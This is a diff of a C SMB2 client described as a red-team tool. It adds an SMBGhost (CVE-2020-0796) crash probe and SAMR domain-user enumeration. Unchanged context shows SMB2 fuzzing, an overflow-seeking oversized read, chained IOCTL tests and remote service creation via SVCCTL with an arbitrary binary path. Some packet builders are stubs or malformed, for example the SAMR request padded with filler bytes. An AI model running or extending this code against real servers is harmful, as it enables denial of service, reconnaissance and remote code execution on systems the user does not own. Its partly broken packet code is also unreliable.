@@ -12,7 +12,8 @@
    - Possible integer overflows in length calculations if malicious server manipulates fields.
    - Code is for authorized security testing; unauthorized use is prohibited.
    - Added fuzzing and targeted packet patterns can induce crashes or reveal vulnerabilities.
-   - Additional IOCTL and trans operations might bypass certain defenses if unpatched. */
+   - Additional IOCTL and trans operations might bypass certain defenses if unpatched.
+ */
 
 #pragma pack(push, 1)
 
@@ -572,14 +573,14 @@ int doSVCCTLCreateService(const char *serviceName, const char *binPath) {
     unsigned char dceRequest[512];
     memset(dceRequest, 0, sizeof(dceRequest));
     size_t index = 0;
-    dceRequest[index++] = 0x05; 
+    dceRequest[index++] = 0x05;
     dceRequest[index++] = 0x00;
     dceRequest[index++] = 0x00;
     dceRequest[index++] = 0x10;
-    dceRequest[index++] = 0x00; 
-    dceRequest[index++] = 0x00; 
-    dceRequest[index++] = 0x00; 
-    dceRequest[index++] = 0x00; 
+    dceRequest[index++] = 0x00;
+    dceRequest[index++] = 0x00;
+    dceRequest[index++] = 0x00;
+    dceRequest[index++] = 0x00;
     for (size_t i=0; i<strlen(serviceName) && index<500; i++) {
         dceRequest[index++] = (unsigned char)serviceName[i];
     }
@@ -605,8 +606,8 @@ int doSRVSVCNetShareEnum() {
     dceRequest[idx++] = 0x00;
     dceRequest[idx++] = 0x00;
     dceRequest[idx++] = 0xE0;
-    dceRequest[idx++] = 0x03; 
-    dceRequest[idx++] = 0x00; 
+    dceRequest[idx++] = 0x03;
+    dceRequest[idx++] = 0x00;
     dceRequest[idx++] = 0x00;
     return doWritePipe(dceRequest, idx);
 }
@@ -677,14 +678,14 @@ int doFuzzSMB2(size_t fuzzCount) {
     return 0;
 }
 
-/* Attempts large read to detect if server handles huge lengths, may identify integer overflow issues. */
+/* Attempts large read to detect if server handles huge lengths (possible integer overflow). */
 int doLargeReadTest() {
     SMB2Header hdr;
     buildSMB2Header(SMB2_READ, gTreeId, gSessionId, &hdr);
     SMB2ReadRequest rreq;
     memset(&rreq, 0, sizeof(rreq));
     rreq.StructureSize    = 49;
-    rreq.Length           = 0xFFFFFFFF; 
+    rreq.Length           = 0xFFFFFFFF;
     rreq.FileIdPersistent = gPipeFidPersistent;
     rreq.FileIdVolatile   = gPipeFidVolatile;
     if (sendSMB2Request(&hdr, &rreq, sizeof(rreq)) < 0) return -1;
@@ -714,6 +715,55 @@ int doChainedIOCTLTests() {
     return 0;
 }
 
+/* Attempts a transform header to check for SMBGhost (CVE-2020-0796) style issues. 
+   Could trigger decompression vulnerabilities if unpatched. */
+int doSMBGhostProbe() {
+    unsigned char transformHeader[64];
+    memset(transformHeader, 0, sizeof(transformHeader));
+    transformHeader[0] = 0xFC;  /* Compressed Transform Header signature start */
+    transformHeader[1] = 'S';
+    transformHeader[2] = 'M';
+    transformHeader[3] = 'B';
+    /* Potentially malformed data to probe server response */
+    transformHeader[4] = 0x01;
+    transformHeader[5] = 0x00;
+    transformHeader[6] = 0x00;
+    transformHeader[7] = 0x00;
+    printf("[Client] Sending SMBGhost probe...\n");
+    if (send(gSock, transformHeader, sizeof(transformHeader), 0) < 0) {
+        perror("send SMBGhost probe");
+        return -1;
+    }
+    SMB2Header ghostResp;
+    unsigned char buf[512];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&ghostResp, buf, sizeof(buf), &payloadLen) < 0) {
+        fprintf(stderr, "[Client] SMBGhost probe response read failed.\n");
+        return -1;
+    }
+    printf("[Client] SMBGhost probe status=0x%08X.\n", ghostResp.Status);
+    return 0;
+}
+
+/* Opens \pipe\samr, does a minimal DCERPC bind, and sends partial request to enumerate users. 
+   Could reveal domain info or be abused to gather user listings. */
+int doSamrEnumUsers() {
+    if (doOpenPipe("\\PIPE\\samr") < 0) {
+        fprintf(stderr, "Failed to open \\pipe\\samr\n");
+        return -1;
+    }
+    unsigned char dcerpcBind[] = { 0x05, 0x00, 0x0B, 0x10, 0x00 };
+    doWritePipe(dcerpcBind, sizeof(dcerpcBind));
+    unsigned char dcerpcEnumStub[64];
+    memset(dcerpcEnumStub, 0x53, sizeof(dcerpcEnumStub));
+    doWritePipe(dcerpcEnumStub, sizeof(dcerpcEnumStub));
+    unsigned char readBuf[256];
+    uint32_t bytesRead;
+    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
+    doClosePipe();
+    printf("[Client] SAMR enumeration attempt finished.\n");
+    return 0;
+}
 /* End of extra red-team capabilities */
 
 int main(int argc, char *argv[]) {
@@ -795,7 +845,6 @@ int main(int argc, char *argv[]) {
         }
     }
 
-    /* Call enhanced red-team functions */
     doFuzzSMB2(5);
     doLargeReadTest();
     doChainedIOCTLTests();
@@ -803,6 +852,13 @@ int main(int argc, char *argv[]) {
     if (doClosePipe() < 0) {
         fprintf(stderr, "Failed to close pipe properly.\n");
     }
+
+    /* Now open SAMR for enumeration (additional red-team step). */
+    doSamrEnumUsers();
+
+    /* Attempt SMBGhost style probe. */
+    doSMBGhostProbe();
+
     close(gSock);
     printf("[Client] Done.\n");
     return EXIT_SUCCESS;
